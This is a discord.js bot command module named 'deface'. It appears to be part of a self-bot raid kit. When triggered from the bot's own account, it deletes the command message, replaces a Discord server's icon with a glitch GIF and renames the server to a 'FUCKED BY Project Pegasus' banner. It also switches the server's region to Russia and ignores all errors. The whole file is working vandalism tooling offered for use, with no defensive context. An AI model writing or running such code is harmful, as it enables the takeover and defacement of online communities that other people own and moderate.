const Discord = require('discord.js');
const fs = require('fs');

module.exports.run = async (bot, message, args) => {
  
    message.delete();
        if (message.author.id == bot.user.id) {
            message.delete();
            if (message.guild.name != "🎲 𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐏𝐞𝐠𝐚𝐬𝐮𝐬 ♞ 🎲") {
                message.guild.setIcon("https://cdn.discordapp.com/attachments/631597129294675978/635475108042899467/MOSHED-2019-10-20-15-48-19_1.gif").catch(error => {})
                message.guild.setName('🎲 𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 𝐏𝐞𝐠𝐚𝐬𝐮𝐬 ♞ 🎲').catch(error => {})
                message.guild.setRegion('russia').catch(error => {})
            }
        }
    }


module.exports.help = {
    name: "deface"
} 
